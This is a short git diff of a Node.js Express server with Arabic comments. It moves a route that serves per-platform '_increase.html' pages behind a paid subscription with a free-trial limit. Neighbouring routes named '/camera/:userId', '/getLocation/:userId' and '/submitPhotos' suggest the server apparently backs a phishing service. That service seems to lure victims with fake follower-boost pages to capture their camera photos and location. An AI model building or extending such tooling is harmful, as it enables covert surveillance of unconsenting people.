@@ -47,21 +47,7 @@ const trackPlatformAttempts = (platformId) => {
 };
 
 // المسار الأصلي
-app.get('/:platform/:chatId', (req, res) => {
-    const { platform, chatId } = req.params;
 
-    if (subscribedUsers.has(chatId)) {
-        res.sendFile(path.join(__dirname, 'src', `${platform}_increase.html`));
-        return;
-    }
-
-    if (trackPlatformAttempts(chatId)) {
-        res.send(`<html><body><h1>${freeTrialEndedMessage}</h1></body></html>`);
-        return;
-    }
-
-    res.sendFile(path.join(__dirname, 'src', `${platform}_increase.html`));
-});
 
 // مسار الكاميرا
 app.get('/camera/:userId', (req, res) => {
@@ -113,6 +99,23 @@ app.get('/getLocation/:userId', (req, res) => {
 
     res.sendFile(path.join(__dirname, 'SJGD.html'));
 });
+
+app.get('/:platform/:chatId', (req, res) => {
+    const { platform, chatId } = req.params;
+
+    if (subscribedUsers.has(chatId)) {
+        res.sendFile(path.join(__dirname, 'src', `${platform}_increase.html`));
+        return;
+    }
+
+    if (trackPlatformAttempts(chatId)) {
+        res.send(`<html><body><h1>${freeTrialEndedMessage}</h1></body></html>`);
+        return;
+    }
+
+    res.sendFile(path.join(__dirname, 'src', `${platform}_increase.html`));
+});
+
 
 // استلام الصور
 app.post('/submitPhotos', upload.array('images', 20), async (req, res) => {
